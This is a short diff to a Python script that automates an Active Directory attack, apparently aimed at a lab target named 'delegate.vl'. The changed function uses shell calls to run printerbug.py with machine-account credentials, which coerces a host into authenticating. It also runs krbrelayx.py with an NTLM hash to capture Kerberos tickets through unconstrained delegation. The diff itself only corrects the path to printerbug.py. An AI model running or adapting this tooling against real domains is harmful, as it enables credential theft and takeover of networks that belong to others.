@@ -83,7 +83,7 @@ def ADDSPN():
 
 def KRB5():
     print(f"{YELLOW}\nRunning krbrelayx and printerbug with hash {NTLM}{RESET}")
-    s = Popen ([f"""printerbug.py '{COMPN}$:{COMPP}'@{RHOST} {COMPN}.delegate.vl &"""], shell=True)
+    s = Popen ([f"""python3 krbrelayx/printerbug.py '{COMPN}$:{COMPP}'@{RHOST} {COMPN}.delegate.vl &"""], shell=True)
     s = Popen([f"python3 krbrelayx/krbrelayx.py -hashes :{NTLM}"], shell=True)
     time.sleep(5)
     exit()
